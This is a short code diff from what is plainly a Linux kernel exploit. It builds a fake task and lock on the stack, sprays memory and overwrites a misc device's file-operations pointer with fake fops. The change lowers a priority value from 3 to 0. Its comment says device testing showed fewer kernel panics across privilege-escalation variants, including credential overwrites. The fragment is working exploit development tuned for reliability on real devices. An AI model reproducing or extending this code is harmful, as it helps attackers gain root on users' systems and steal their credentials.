@@ -1176,7 +1176,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             pi_left = 0;
             stack_task = fake_task;
             stack_lock = fake_lock;
-            stack_prio = 3;
+            /* prio MUST be 0 (09-13 device evidence: every surviving walk
+             * stamped prio=0; the prio=3 walks KP'd at a materially higher
+             * rate across park/cred/oracle classes). */
+            stack_prio = 0;
             stack_deadline = 0;
             pr_info("stack SLIDE_SWAP: *MISC.fops(%016llx) = fake_fops "
                     "(%016llx) lock=spray\n",
